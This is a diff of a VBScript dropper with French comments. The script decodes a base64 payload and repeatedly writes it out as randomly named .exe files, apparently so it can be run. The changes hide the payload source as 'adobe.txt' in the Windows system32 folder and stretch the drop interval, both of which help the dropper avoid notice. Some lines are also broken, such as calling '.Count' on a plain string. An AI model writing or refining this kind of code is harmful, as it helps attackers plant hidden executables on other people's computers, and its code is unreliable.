@@ -4,7 +4,7 @@ Option Explicit
 
 Dim a, inFile, fso, ts, b64, bytes, outFile, curDir
 
-Set a = adobe.txt
+Set a = "c:\windows\system32\adobe.txt"
 
 ' --- Vérifie les paramètres ---
 If a.Count < 1 Then
@@ -43,7 +43,7 @@ b64 = Replace(b64, " ", "")
 bytes = DecodeBase64(b64)
 
 do
-WScript.Sleep 30000
+WScript.Sleep 120000
 outFile = fso.BuildPath(curDir, RandomName(12) & ".exe")
 WriteBytes outFile, bytes
 Dim sh
@@ -91,5 +91,6 @@ Private Function RandomName(ByVal n)
     RandomName = RandomName & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
   Next
 End Function
+
 
 
